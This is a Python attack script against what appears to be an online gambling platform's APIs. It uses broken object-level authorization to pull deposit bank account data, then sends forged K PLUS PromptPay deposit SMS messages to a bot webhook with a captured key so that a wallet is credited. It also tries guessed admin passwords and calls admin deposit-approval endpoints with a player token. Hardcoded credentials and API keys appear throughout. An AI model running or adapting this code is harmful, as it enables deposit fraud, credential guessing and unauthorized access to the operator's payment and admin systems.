#!/usr/bin/env python3
"""probe_critical.py — Use F09 BOLA findings to bypass admin approval.

   F09 revealed:
   - /bo/info/payment-bank-account → deposit mule account bank_no (needed for webhook)
   - bot_webhook_url = https://{TID}.xyzwalldetop.com (direct webhook platform!)
   - bgapi POST fix: add template + languagecode + correlationid headers

   Steps:
   1. Get deposit mule bank_no from /bo/info/payment-bank-account
   2. Get deposit routing from /bo/info/bank-pool
   3. Try xyzwalldetop.com webhook with PAPDIEAW-KEY
   4. Try bgapi POST with correct headers (template+languagecode+correlationid)
   5. Try BO login with correct headers
"""
import base64, json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
XYZBOT = f"https://{TID}.xyzwalldetop.com"
DOMAIN = "m.vak88z2.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

PAPDIEAW_KEY  = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
BANK_INFO_ID  = "18a9502b-94ae-4188-8841-094be8b3b974"  # KBANK deposit bank_info
FRESH_TX_REF  = "016282212408DTF71867"
ADMIN_UUID    = "5958356c-eb4e-4e07-a155-83e4382e3532"

JWT_FILE = pathlib.Path(".jwt.vak88z2")

def get_jwt():
    cached = JWT_FILE.read_text().strip() if JWT_FILE.exists() else ""
    if cached:
        p = json.loads(base64.urlsafe_b64decode(cached.split(".")[1] + "=="))
        if p.get("exp", 0) - time.time() > 300:
            return cached
    r = requests.post(f"{PBAPI}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": "0972571110", "password": "Pwned2026!"},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE.write_text(jwt)
        return jwt
    raise RuntimeError(f"Auth: {r.status_code}")

JWT = get_jwt()
HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}"}
# bgapi headers with required fields (from F09: POST needs these)
BGH = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "languagecode": "en", "correlationid": str(uuid.uuid4()),
       "Content-Type": "application/json"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    return r.json().get("data", [{}])[0].get("balance", "?") if r.ok else f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. Get deposit mule bank account ─────────────────────────────────────────
print("=== 1. BOLA: /bo/info/payment-bank-account ===")
mule_bank_no = None
r = requests.get(f"{BGAPI}/bo/info/payment-bank-account",
                 headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                 params={"domain": DOMAIN},
                 timeout=15)
print(f"  HTTP {r.status_code}")
if r.ok:
    print(f"  Response: {r.text[:800]}")
    try:
        data = r.json()
        items = data if isinstance(data, list) else data.get("data", [data])
        for item in (items if isinstance(items, list) else [items]):
            bn = (item.get("bank_no") or item.get("account_no") or
                  item.get("account_number") or "")
            bc = item.get("bank_code", "?")
            aid = str(item.get("id", "?"))[:8]
            print(f"    {aid} | {bc} | bank_no={bn}")
            if bn and bc == "KBANK":
                mule_bank_no = bn
                print(f"  [!!!] Found KBANK mule bank_no: {mule_bank_no}")
    except Exception as e:
        print(f"  parse error: {e}")

# ── 2. Bank pool / routing ────────────────────────────────────────────────────
print("\n=== 2. BOLA: /bo/info/bank-pool ===")
r2 = requests.get(f"{BGAPI}/bo/info/bank-pool",
                  headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                  params={"domain": DOMAIN},
                  timeout=15)
print(f"  HTTP {r2.status_code}: {r2.text[:500]}")

# ── 3. General config (re-confirm bot webhook URL) ───────────────────────────
print("\n=== 3. /bo/info/general-config ===")
r3 = requests.get(f"{BGAPI}/bo/info/general-config",
                  headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                  params={"domain": DOMAIN},
                  timeout=15)
print(f"  HTTP {r3.status_code}: {r3.text[:300]}")
bot_webhook_url = None
if r3.ok:
    try:
        bot_webhook_url = r3.json().get("bot_webhook_external_url", "")
        print(f"  bot_webhook_url: {bot_webhook_url}")
    except Exception:
        pass

# ── 4. xyzwalldetop.com webhook endpoints ────────────────────────────────────
print("\n=== 4. xyzwalldetop.com bot webhook ===")
bank_no = mule_bank_no or "0543753327"
for path in ["/webhook-sms", "/webhook-kbank", "/webhooks/sms/truewallet",
             "/webhook", "/deposit", "/deposit/confirm", "/health", "/"]:
    r = requests.post(f"{XYZBOT}{path}",
                      headers={"Content-Type": "application/json",
                               "PAPDIEAW-KEY": PAPDIEAW_KEY,
                               "User-Agent": "okhttp/3.12.1"},
                      json={"address": "K-Bank",
                            "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
                            "timestamp": int(time.time() * 1000),
                            "bank_no": bank_no},
                      timeout=8)
    if r.status_code not in (404, 503, 521):
        print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  POST {path}: {r.status_code}")
    time.sleep(0.3)

# Also try GET on xyzwalldetop
r_get = requests.get(f"{XYZBOT}/health", timeout=8)
print(f"  GET /health: {r_get.status_code}: {r_get.text[:100]}")

# ── 5. bgapi POST with correct headers (F09 fix) ─────────────────────────────
print("\n=== 5. bgapi POST with template+languagecode+correlationid ===")

# 5a: Try BO authentication
for creds in [{"username": "admin", "password": "Vak88z:admin"},
              {"username": "vak88admin", "password": "Vak88z:admin"},
              {"username": "admin", "password": "Aa112233"}]:
    r = requests.post(f"{BGAPI}/bo/authentication",
                      headers={**BGH, "Authorization": ""},  # no JWT for auth
                      json={**creds, "domain": DOMAIN},
                      timeout=10)
    print(f"  auth {creds['username']}: HTTP {r.status_code}: {r.text[:200]}")
    if r.status_code in (200, 201):
        bo_jwt = r.json().get("accessToken")
        print(f"  [!!!] BO JWT obtained!")
    time.sleep(0.3)

# 5b: Try auto-deposit-assign-task with player JWT + correct headers
for payload in [
    {"domain": DOMAIN, "action": "approve", "deposit_transaction_id": "latest"},
    {"domain": DOMAIN, "status": "approved"},
]:
    r = requests.post(f"{BGAPI}/bo/auto-deposit-assign-task/admin-do-task",
                      headers=BGH, json=payload, timeout=10)
    if r.status_code not in (401, 403, 404):
        print(f"  [!!!] approve task: HTTP {r.status_code}: {r.text[:200]}")
    else:
        print(f"  approve task: HTTP {r.status_code}")

# 5c: Try accessing deposit queue via bgapi GET with correct headers
for path in ["/bo/auto-deposit-assign-task", "/bo/deposit-transaction",
             "/bo/info/deposit-queue"]:
    r = requests.get(f"{BGAPI}{path}",
                     headers={**BGH, "Authorization": f"Bearer {JWT}"},
                     params={"domain": DOMAIN, "skip": 0, "limit": 5},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  [!!!] GET {path}: HTTP {r.status_code}: {r.text[:300]}")

# ── 6. Submit deposit through xyzwalldetop if webhook confirms ────────────────
if bot_webhook_url:
    print(f"\n=== 6. Direct deposit via bot_webhook_url: {bot_webhook_url} ===")
    for path in ["/deposit-confirm", "/webhook-kbank", "/webhook-sms", "/"]:
        r = requests.post(f"{bot_webhook_url}{path}",
                          headers={"Content-Type": "application/json",
                                   "PAPDIEAW-KEY": PAPDIEAW_KEY},
                          json={"address": "K-Bank",
                                "message": f"K PLUS\nรับเงินผ่าน PromptPay\n500.00 บาท\nRef. {FRESH_TX_REF}",
                                "bank_no": bank_no,
                                "timestamp": int(time.time() * 1000)},
                          timeout=8)
        print(f"  POST {path}: HTTP {r.status_code}: {r.text[:150]}")

time.sleep(3)
print(f"\nFINAL wallet: {wallet()}")
